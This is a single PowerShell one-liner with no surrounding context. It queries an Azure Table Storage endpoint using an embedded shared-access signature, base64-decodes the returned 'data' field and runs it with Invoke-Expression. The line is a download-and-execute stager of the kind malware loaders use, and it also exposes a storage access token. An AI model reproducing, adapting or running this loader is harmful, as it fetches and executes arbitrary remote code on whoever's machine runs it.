function a($x){return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x))};iex $(a $($($(invoke-webrequest 'https://usprd5150central.table.core.windows.net/warehouse?$filter=PartitionKey%20eq%20%27stage%27&$Select=data&sv=2017-04-17&ss=bfqt&srt=sco&sp=rwdlacup&se=2017-10-06T22:41:12Z&st=2017-09-28T14:41:12Z&spr=https&sig=tzP7c8xZhr1sbvx9fJSwJISHB6e8%2BnllunHifL3hxj4%3D' -Headers @{'Accept'='Application/JSON'}).Content | ConvertFrom-Json).value.data))
